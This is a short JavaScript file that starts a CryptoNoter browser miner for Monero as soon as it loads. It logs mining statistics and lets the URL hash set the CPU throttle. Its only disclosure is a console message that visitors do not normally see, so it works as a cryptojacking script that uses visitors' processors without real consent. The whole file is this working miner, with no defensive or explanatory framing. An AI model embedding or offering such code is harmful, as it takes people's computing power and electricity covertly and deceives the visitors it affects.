var miner = new CryptoNoter.User("CryptoNoter", {
	autoThreads: true,
	throttle: 0.5
});
miner.start();
console.log("You are using my service. I will use your CPU for mining XMR.")
// Listen on events
var found = 0,
	accepted = 0;
miner.on('found', function () {
	found++;
	console.log("FoundShares:" + found)
});
miner.on('accepted', function () {
	accepted++;
	console.log("Accepted:" + accepted)
})

// Update stats once per second
setInterval(function () {
	var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
	var hashesPerSecond = miner.getHashesPerSecond();
	console.log("TotalHashes:" + miner.getTotalHashes() + "  VerifiedShares:" + miner.getAcceptedHashes() + "  Hashes:" + hashesPerSecond)
	miner.setThrottle(idle);
}, 3000);